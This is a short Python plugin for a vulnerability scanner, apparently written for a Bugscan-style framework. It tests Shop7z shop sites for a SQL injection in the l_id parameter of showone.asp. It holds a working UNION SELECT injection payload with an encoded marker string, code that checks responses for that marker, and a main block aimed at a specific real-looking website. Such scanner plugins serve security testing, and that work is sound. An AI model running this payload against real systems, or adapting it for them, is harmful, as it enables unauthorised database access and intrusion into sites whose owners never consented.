#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = Shop7z showone.asp l_id参数SQL注入漏洞
import re

def assign(service, arg):
    if service == "shop7z":
        return True, arg

def audit(arg):
    payload = 'showone.asp?l_id=1%20UNION%20SELECT%201%2C2%2C3%2CCHR%2832%29%2bCHR%2835%29%2bCHR%28116%29%2bCHR%28121%29%2bCHR%28113%29%2bCHR%2835%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20from%20%20MSysAccessObjects'
    target = arg + payload
    code, head,res, errcode, _   = curl.curl2(target) 
    if  code == 200 and '#tyq#' in res:
        security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('shop7z', 'http://www.99ysbjw.com/')[1])